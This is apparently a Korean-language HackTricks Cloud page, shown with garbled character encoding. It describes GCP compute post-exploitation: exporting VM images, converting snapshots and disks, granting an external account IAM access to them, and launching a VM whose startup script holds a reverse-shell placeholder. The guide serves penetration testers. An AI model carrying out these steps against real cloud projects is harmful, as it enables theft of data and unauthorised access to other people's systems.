# GCP - ì»´í“¨íŠ¸ í›„ ìµìŠ¤í”Œë¡œì‡

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## ì»´í“¨íŠ¸

ì»´í“¨íŠ¸ ë° VPC (ë„¤íŠ¸ì›Œí‚¹)ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../../gcp-pentesting/gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-pentesting/gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### ì´ë¯¸ì§€ ë‚´ë³´ë‚´ê¸° ë° ë¡œì»¬ì—ì„œ ê²€ì‚¬í•˜ê¸°

ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì´ë¯¸ ì¡´ì¬í•˜ëŠ” ì´ë¯¸ì§€ ë‚´ì— í¬í•¨ëœ ë°ì´í„°ì— **ì ‘ê·¼**í•˜ê±°ë‚˜ **ì‹¤í–‰ ì¤‘ì¸ ê°€ìƒ ë¨¸ì‹ ì˜ ìƒˆ ì´ë¯¸ì§€ë¥¼ ìƒì„±**í•˜ê³  ì‹¤í–‰ ì¤‘ì¸ ê°€ìƒ ë¨¸ì‹ ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ì—†ì´ ë°ì´í„°ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê°€ìƒ ë¨¸ì‹  ì´ë¯¸ì§€ë¥¼ ë²„í‚·ìœ¼ë¡œ ë‚´ë³´ë‚´ê³ , í•´ë‹¹ ì´ë¯¸ì§€ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ì—¬ ë¡œì»¬ì—ì„œ ë§ˆìš´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ëª…ë ¹ì–´ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

ì´ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” ê³µê²©ìëŠ” ì €ì¥ ë²„í‚·ì— ëŒ€í•œ ê¶Œí•œê³¼ í™•ì‹¤íˆ **cloudbuildì— ëŒ€í•œ ê¶Œí•œ**ì´ í•„ìš”í•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ ì´ ì„œë¹„ìŠ¤ê°€ ë‚´ë³´ë‚´ê¸° ì‘ì—…ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ìš”ì²­ë  ê²ƒì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. 
ë˜í•œ, ì´ ì‘ì—…ì´ ì‘ë™í•˜ë ¤ë©´ codebuild SAì™€ compute SAê°€ íŠ¹ê¶Œ ê¶Œí•œì„ ê°–ê³  ìˆì–´ì•¼ í•©ë‹ˆë‹¤.
cloudbuild SA `<project-id>@cloudbuild.gserviceaccount.com`ì€ ë‹¤ìŒê³¼ ê°™ì€ ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤:

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

ê·¸ë¦¬ê³  SA `<project-id>-compute@developer.gserviceaccount.com`ì€ ë‹¤ìŒê³¼ ê°™ì€ ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤:

* roles/compute.storageAdmin
* roles/storage.objectAdmin

### ìŠ¤ëƒ…ìƒ· ë° ë””ìŠ¤í¬ ë‚´ë³´ë‚´ê¸° ë° ê²€ì‚¬

ìŠ¤ëƒ…ìƒ·ê³¼ ë””ìŠ¤í¬ë¥¼ ì§ì ‘ ë‚´ë³´ë‚¼ ìˆ˜ëŠ” ì—†ì§€ë§Œ, ìŠ¤ëƒ…ìƒ·ì„ ë””ìŠ¤í¬ë¡œ ë³€í™˜í•˜ê³ , ë””ìŠ¤í¬ë¥¼ ì´ë¯¸ì§€ë¡œ ë³€í™˜í•œ ë‹¤ìŒ, **ì´ì „ ì„¹ì…˜**ì„ ë”°ë¼ í•´ë‹¹ ì´ë¯¸ì§€ë¥¼ ë¡œì»¬ì—ì„œ ê²€ì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### ì´ë¯¸ì§€ ê²€ì‚¬ë¥¼ í†µí•œ ê°€ìƒ ë¨¸ì‹  ìƒì„±

ê³µê²©ìê°€ ì´ë¯¸ì§€ë¥¼ ìƒì„±í•œ ìœ„ì¹˜ì—ì„œ **ì´ë¯¸ì§€ì— ì €ì¥ëœ ë°ì´í„°** ë˜ëŠ” **ì‹¤í–‰ ì¤‘ì¸ ê°€ìƒ ë¨¸ì‹ **ì— ì €ì¥ëœ ë°ì´í„°ì— ì ‘ê·¼í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•  ë•Œ, ì™¸ë¶€ ê³„ì •ì— ì´ë¯¸ì§€ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```
ê·¸ë¦¬ê³  ê·¸ê²ƒìœ¼ë¡œë¶€í„° ìƒˆë¡œìš´ VMì„ ìƒì„±í•˜ì„¸ìš”:
```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```
ë§Œì•½ ì´ë¯¸ì§€ì— ëŒ€í•œ ì™¸ë¶€ ê³„ì • ì•¡ì„¸ìŠ¤ë¥¼ ì œê³µí•  ìˆ˜ ì—†ë‹¤ë©´, í”¼í•´ìì˜ í”„ë¡œì íŠ¸ì—ì„œ í•´ë‹¹ ì´ë¯¸ì§€ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°€ìƒ ë¨¸ì‹ ì„ ì‹œì‘í•˜ê³  ë©”íƒ€ë°ì´í„°ë¥¼ ì‹¤í–‰í•˜ì—¬ ì—­ì‰˜ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ë§¤ê°œë³€ìˆ˜ë¥¼ ì¶”ê°€í•˜ì„¸ìš”:
```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```
### ìŠ¤ëƒ…ìƒ·/ë””ìŠ¤í¬ ê²€ì‚¬ë¥¼ ìœ„í•´ VMì— ì—°ê²°í•˜ê¸°

ë””ìŠ¤í¬ë‚˜ ìŠ¤ëƒ…ìƒ·ì— ì €ì¥ëœ ë°ì´í„°ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´, ìŠ¤ëƒ…ìƒ·ì„ ë””ìŠ¤í¬ë¡œ ë³€í™˜í•˜ê±°ë‚˜ ë””ìŠ¤í¬ë¥¼ ì´ë¯¸ì§€ë¡œ ë³€í™˜í•œ í›„ ì´ì „ ë‹¨ê³„ë¥¼ ë”°ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜ëŠ” ì™¸ë¶€ ê³„ì •ì— ë””ìŠ¤í¬ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì‹œì‘ì ì´ ìŠ¤ëƒ…ìƒ·ì¸ ê²½ìš° ìŠ¤ëƒ…ìƒ·ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•˜ê±°ë‚˜ ìŠ¤ëƒ…ìƒ·ì—ì„œ ë””ìŠ¤í¬ë¥¼ ìƒì„±í•©ë‹ˆë‹¤):
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```
**ì¸ìŠ¤í„´ìŠ¤ì— ë””ìŠ¤í¬ë¥¼ ì—°ê²°**í•©ë‹ˆë‹¤:

```bash
gcloud compute instances attach-disk INSTANCE_NAME --disk DISK_NAME --zone ZONE
```
```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```
VM ë‚´ì—ì„œ ë””ìŠ¤í¬ë¥¼ ë§ˆìš´íŠ¸í•©ë‹ˆë‹¤:

1. **VMì— SSHë¡œ ì ‘ì†**í•©ë‹ˆë‹¤:

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```
2. **ë””ìŠ¤í¬ ì‹ë³„**: VM ë‚´ë¶€ì— ë“¤ì–´ê°€ë©´ ë””ìŠ¤í¬ ì¥ì¹˜ë¥¼ ë‚˜ì—´í•˜ì—¬ ìƒˆë¡œìš´ ë””ìŠ¤í¬ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ `/dev/sdb`, `/dev/sdc` ë“±ìœ¼ë¡œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
3. **ë””ìŠ¤í¬ í¬ë§· ë° ë§ˆìš´íŠ¸** (ìƒˆë¡œìš´ ë˜ëŠ” ì›ì‹œ ë””ìŠ¤í¬ì¸ ê²½ìš°):
*   ë§ˆìš´íŠ¸ í¬ì¸íŠ¸ë¥¼ ìƒì„±í•©ë‹ˆë‹¤:

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```
*   ë””ìŠ¤í¬ë¥¼ ë§ˆìš´íŠ¸í•©ë‹ˆë‹¤:

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

ìŠ¤ëƒ…ìƒ· ë˜ëŠ” ë””ìŠ¤í¬ì— ì™¸ë¶€ í”„ë¡œì íŠ¸ì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ì—†ëŠ” ê²½ìš°, ìŠ¤ëƒ…ìƒ·/ë””ìŠ¤í¬ì™€ ë™ì¼í•œ í”„ë¡œì íŠ¸ì˜ ì¸ìŠ¤í„´ìŠ¤ ë‚´ì—ì„œ ì´ ì‘ì—…ì„ ìˆ˜í–‰í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
